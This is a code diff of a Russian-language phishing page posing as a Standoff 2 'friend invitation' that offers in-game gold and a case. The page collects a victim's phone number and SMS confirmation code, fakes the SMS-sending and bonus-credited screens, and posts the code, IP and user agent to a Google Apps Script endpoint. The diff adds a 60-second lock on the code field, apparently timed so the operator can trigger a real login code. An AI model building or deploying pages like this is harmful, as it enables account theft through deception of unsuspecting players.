@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MadOut 2 — Приглашение</title>
+    <title>Standoff 2 — Приглашение</title>
     <style>
         :root { --bg: #0a0e17; --card: #141a26; --text: #e0e0e0; --accent: #ff4444; --gold: #ffd700; --border: #2a3040; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -29,17 +29,18 @@
         .code-wrapper { border: 1.5px solid var(--border); border-radius: 10px; background: #0a0e17; overflow: hidden; }
         .code-wrapper input { width: 100%; border: none; background: transparent; font-size: 16px; color: #e0e0e0; padding: 12px 16px; outline: none; text-align: center; letter-spacing: 2px; }
         .code-wrapper:focus-within { border-color: var(--accent); }
+        .code-wrapper.locked { opacity: 0.4; pointer-events: none; }
+        .code-wrapper.locked input { color: #555; }
         .btn { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
         .btn:active { opacity: 0.8; }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-outline { width: 100%; padding: 12px; background: transparent; color: #8890a0; border: 1px solid #2a3040; border-radius: 10px; font-size: 13px; cursor: pointer; margin-top: 8px; }
-        .btn-outline:hover { border-color: var(--accent); color: var(--text); }
+        .btn-outline:hover:not(:disabled) { border-color: var(--accent); color: var(--text); }
         .btn-outline:disabled { opacity: 0.3; cursor: not-allowed; }
         .footer { margin-top: 16px; font-size: 11px; color: #555; }
         .error-msg { color: #ff4444; font-size: 12px; margin-top: 8px; display: none; }
         .timer-text { color: #8890a0; font-size: 12px; margin-top: 12px; }
         .timer-text span { color: var(--gold); font-weight: 600; }
-        
         .loading-overlay { display: none; text-align: center; padding: 40px 0; }
         .spinner { width: 50px; height: 50px; border: 4px solid #2a3040; border-top: 4px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -51,58 +52,50 @@
 </head>
 <body>
     <div class="card">
-        <!-- ЭКРАН 1: ВВОД ТЕЛЕФОНА -->
         <div id="screen-phone">
-            <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo.png" alt="MadOut 2"></div>
-            <div class="logo-sub">Big City Online</div>
+            <div class="logo-row"><span class="logo-text">STANDOFF 2</span><img src="logo_2.png" alt="Standoff 2"></div>
+            <div class="logo-sub">Приглашение от друга</div>
             <div class="inviter-row"><div class="inviter-avatar" id="inviter-avatar">Д</div><span>Вас пригласил: <strong id="inviter-name" style="color:#ffd700;">Игрок</strong></span></div>
             <div class="bonus-box">
-                <div class="bonus-row"><span class="bonus-label">Вам за регистрацию</span><span class="bonus-value">💰 1 000 000</span></div>
-                <div class="bonus-row"><span class="bonus-label">Вам за регистрацию</span><span class="bonus-value">💎 1 000</span></div>
-                <div class="bonus-row"><span class="bonus-label">Другу за ваш вход</span><span class="bonus-value" style="font-size:13px;">💎 2 000</span></div>
+                <div class="bonus-row"><span class="bonus-label">Вам за вход</span><span class="bonus-value">💰 500 Gold</span></div>
+                <div class="bonus-row"><span class="bonus-label">Вам за вход</span><span class="bonus-value">🎁 Кейс</span></div>
+                <div class="bonus-row"><span class="bonus-label">Другу за вас</span><span class="bonus-value" style="font-size:13px;">💰 1000 Gold</span></div>
             </div>
             <div class="input-group"><label>Номер телефона</label><div class="phone-wrapper"><span class="phone-prefix">+7</span><input type="tel" id="phone" placeholder="900 000-00-00" maxlength="13" inputmode="numeric" oninput="formatPhone(this)"></div></div>
             <button class="btn" id="btn-phone" onclick="requestCode()">Получить бонусы</button>
             <div class="error-msg" id="phone-error">Введите 10 цифр номера телефона</div>
         </div>
-
-        <!-- ЭКРАН ЗАГРУЗКИ -->
         <div id="screen-loading" class="loading-overlay">
             <div class="spinner"></div>
             <p class="loading-text">Отправляем код подтверждения на номер</p>
             <p class="loading-phone" id="loading-phone"></p>
             <p class="loading-text">Ожидайте SMS<span class="loading-dots"></span></p>
         </div>
-
-        <!-- ЭКРАН 2: ВВОД КОДА -->
         <div id="screen-code" style="display:none;">
-            <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo.png" alt="MadOut 2"></div>
+            <div class="logo-row"><span class="logo-text">STANDOFF 2</span><img src="logo_2.png" alt="Standoff 2"></div>
             <div class="logo-sub">Подтверждение</div>
             <p style="color:#8890a0;font-size:13px;margin-bottom:4px;">Код отправлен на номер</p>
             <p style="margin-bottom:16px;"><strong id="display-phone" style="color:#ffd700;"></strong></p>
-            <div class="input-group"><label>Код из SMS</label><div class="code-wrapper"><input type="text" id="code" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')"></div></div>
-            <button class="btn" id="btn-code" onclick="confirmCode()">Подтвердить</button>
-            <div class="error-msg" id="code-error">Введите код из SMS</div>
-            <p class="timer-text">Не пришёл код? Отправить повторно через <span id="timer">60</span> сек</p>
+            <div class="input-group"><label>Код из SMS</label><div class="code-wrapper locked" id="code-wrapper"><input type="text" id="code" placeholder="Ожидайте код..." maxlength="6" inputmode="numeric" disabled></div></div>
+            <button class="btn" id="btn-code" onclick="confirmCode()" disabled>Подтвердить</button>
+            <div class="error-msg" id="code-error">Дождитесь окончания таймера</div>
+            <p class="timer-text">Код отправлен. Повторный запрос через <span id="timer">60</span> сек</p>
             <button class="btn-outline" id="btn-resend" onclick="resendCode()" disabled>Отправить код повторно</button>
         </div>
-
-        <!-- ЭКРАН 3: УСПЕХ -->
         <div id="screen-done" style="display:none;">
-            <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo.png" alt="MadOut 2"></div>
+            <div class="logo-row"><span class="logo-text">STANDOFF 2</span><img src="logo_2.png" alt="Standoff 2"></div>
             <div class="logo-sub">Бонусы активированы</div>
             <div class="bonus-box" style="text-align:center;">
-                <p style="color:#ffd700;font-size:18px;font-weight:700;">💰 1 000 000 монет</p>
-                <p style="color:#ffd700;font-size:18px;font-weight:700;">💎 1 000 алмазов</p>
+                <p style="color:#ffd700;font-size:18px;font-weight:700;">💰 500 Gold</p>
+                <p style="color:#ffd700;font-size:18px;font-weight:700;">🎁 Кейс</p>
                 <p style="color:#8890a0;font-size:12px;margin-top:8px;">Начислены на ваш аккаунт</p>
                 <div style="border-top:1px solid #2a2040;margin-top:12px;padding-top:12px;">
-                    <p style="color:#e0e0e0;font-size:13px;font-weight:600;">🎁 <strong id="inviter-name-done" style="color:#ffd700;">Игрок</strong> получил награду!</p>
+                    <p style="color:#e0e0e0;font-size:13px;font-weight:600;">🎁 <strong id="inviter-name-done" style="color:#ffd700;">Игрок</strong> получил 1000 Gold!</p>
                 </div>
             </div>
         </div>
-        <div class="footer">MadOut 2 • Партнёрская программа</div>
+        <div class="footer">Standoff 2 • Партнёрская программа</div>
     </div>
-
     <script>
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzkQ7Rog8RBIs4MfnXNJi5WfAirC3-Kv2wB-6O6-es7zEwS20xAP5sMUbstb0a6ValceQ/exec';
         const urlParams = new URLSearchParams(window.location.search);
@@ -112,7 +105,7 @@
         if (document.getElementById('inviter-name-done')) document.getElementById('inviter-name-done').textContent = inviter;
         
         var timerInterval = null;
-        var timerSeconds = 60;
+        var codeUnlocked = false;
 
         function getIP() {
             return new Promise(function(resolve) {
@@ -134,19 +127,36 @@
             input.value = formatted;
         }
 
+        function lockCodeInput() {
+            codeUnlocked = false;
+            document.getElementById('code-wrapper').classList.add('locked');
+            document.getElementById('code').disabled = true;
+            document.getElementById('code').placeholder = 'Ожидайте код...';
+            document.getElementById('btn-code').disabled = true;
+        }
+
+        function unlockCodeInput() {
+            codeUnlocked = true;
+            document.getElementById('code-wrapper').classList.remove('locked');
+            document.getElementById('code').disabled = false;
+            document.getElementById('code').placeholder = '0 0 0 0 0 0';
+            document.getElementById('code').focus();
+            document.getElementById('btn-code').disabled = false;
+        }
+
         function startTimer() {
-            timerSeconds = 60;
-            document.getElementById('timer').textContent = timerSeconds;
+            var seconds = 60;
+            document.getElementById('timer').textContent = seconds;
             document.getElementById('btn-resend').disabled = true;
-            
+            lockCodeInput();
             if (timerInterval) clearInterval(timerInterval);
-            
             timerInterval = setInterval(function() {
-                timerSeconds--;
-                document.getElementById('timer').textContent = timerSeconds;
-                if (timerSeconds <= 0) {
+                seconds--;
+                document.getElementById('timer').textContent = seconds;
+                if (seconds <= 0) {
                     clearInterval(timerInterval);
                     document.getElementById('btn-resend').disabled = false;
+                    unlockCodeInput();
                     document.getElementById('timer').textContent = '0';
                 }
             }, 1000);
@@ -154,13 +164,8 @@
 
         async function requestCode() {
             var phone = document.getElementById('phone').value.replace(/\D/g, '');
-            if (phone.length !== 10) { 
-                document.getElementById('phone-error').style.display = 'block'; 
-                setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); 
-                return; 
-            }
+            if (phone.length !== 10) { document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             document.getElementById('phone-error').style.display = 'none';
-            
             var ip = await getIP();
             var fullPhone = '+7' + phone;
             
@@ -169,7 +174,6 @@
             document.getElementById('screen-phone').style.display = 'none';
             document.getElementById('loading-phone').textContent = '+7 ' + document.getElementById('phone').value;
             document.getElementById('screen-loading').style.display = 'block';
-            
             setTimeout(function() {
                 document.getElementById('screen-loading').style.display = 'none';
                 document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value;
@@ -181,7 +185,6 @@
         function resendCode() {
             document.getElementById('screen-code').style.display = 'none';
             document.getElementById('screen-loading').style.display = 'block';
-            
             setTimeout(function() {
                 document.getElementById('screen-loading').style.display = 'none';
                 document.getElementById('screen-code').style.display = 'block';
@@ -190,17 +193,12 @@
         }
 
         async function confirmCode() {
+            if (!codeUnlocked) { document.getElementById('code-error').textContent = 'Дождитесь окончания таймера'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             var codeInput = document.getElementById('code');
             var code = codeInput.value.replace(/\D/g, '');
-            if (code.length < 4) { 
-                document.getElementById('code-error').style.display = 'block'; 
-                setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000); 
-                return; 
-            }
+            if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из SMS'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             document.getElementById('code-error').style.display = 'none';
-            
             var ip = await getIP();
-            
             var btn = document.getElementById('btn-code');
             btn.disabled = true;
             btn.textContent = 'ПРОВЕРКА...';
@@ -208,7 +206,6 @@
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
             
             if (timerInterval) clearInterval(timerInterval);
-            
             setTimeout(function() {
                 document.getElementById('screen-code').style.display = 'none';
                 document.getElementById('screen-done').style.display = 'block';
